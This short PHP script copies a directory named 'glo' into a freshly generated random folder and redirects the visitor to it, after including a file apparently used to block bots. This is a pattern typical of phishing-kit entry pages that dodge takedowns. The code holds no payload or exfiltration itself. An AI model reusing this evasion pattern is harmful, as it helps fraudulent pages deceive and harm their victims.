<?php

include('tblockt.php');

$Length = 16;
$MyStrng = substr(str_shuffle(md5(time())), 0, $Length);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$MyStrng)
{
	$dir = opendir($src);
	@mkdir($MyStrng);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$MyStrng . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$MyStrng . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="glo";
recurse_copy( $src, $MyStrng );

header("location:".$MyStrng."");

?>
